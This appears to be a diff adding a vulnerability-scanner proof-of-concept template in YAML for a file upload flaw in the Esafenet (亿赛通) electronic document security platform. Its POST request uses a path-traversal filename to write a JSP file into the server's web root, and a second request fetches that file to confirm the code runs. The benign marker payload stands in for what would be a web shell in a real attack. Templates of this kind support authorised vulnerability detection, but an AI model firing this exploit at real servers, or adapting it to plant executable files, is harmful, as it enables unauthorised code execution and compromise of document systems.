@@ -1,0 +1,29 @@
+id: poc-yaml-yisaitong-esafenet-importfiletype-file-upload
+info:
+  name: 亿赛通电子文档平台 importFileType 文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 亿赛通电子文档安全管理系统
+variables:
+  r_filename: random_str(5)
+  r_boundary: random_str(8)
+  r_content: random_str(10)
+requests:
+- method: POST
+  path: /CDGServer3/fileType/importFileType.do?flag=syn_user_policy
+  headers:
+    Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{.r_boundary}}
+  data: "--WebKitFormBoundary{{.r_boundary}}\r\nContent-Disposition: form-data; name=\"\
+    fileshare\"; filename=\"/..\\..\\..\\..\\webapps\\ROOT\\\\{{.r_filename}}.jsp\"\
+    \r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println(\"{{.r_content}}\"\
+    );%>\r\n--WebKitFormBoundary{{.r_boundary}}--\r\n\r\n"
+  expression: 'status_code == 200 &&  contains(body, "\"result\":\"xmlFail\"")
+
+    '
+- method: GET
+  path: /{{.r_filename}}.jsp
+  expression: 'status_code == 200 &&  contains(body, r_content)
+
+    '
+transport: http
